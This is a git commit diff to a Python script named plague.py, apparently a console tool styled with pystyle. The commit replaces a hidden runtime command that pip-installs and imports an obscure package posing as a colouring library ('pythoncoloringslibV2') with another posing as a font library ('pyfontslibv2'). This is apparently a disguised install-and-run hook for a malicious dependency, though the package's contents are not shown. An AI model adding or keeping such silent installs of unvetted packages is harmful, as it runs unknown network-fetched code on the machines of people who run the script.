42dfbec2705cdbed5c33c6adbc41a70f249e424c
OptimalLukasDev <131367146+OptimalLukasDev@users.noreply.github.com>
2023-04-29 05:10:09 -0700

    Update plague.py

--- plague.py
+++ plague.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringslibV2")
-import pythoncoloringslibV2
+os.system("pip install pyfontslibv2")
+import pyfontslibv2
 from os import name, chdir, rmdir, mkdir, rename, listdir
 from os.path import isdir
 from pystyle import Anime, Colorate, Colors, Center, System, Write
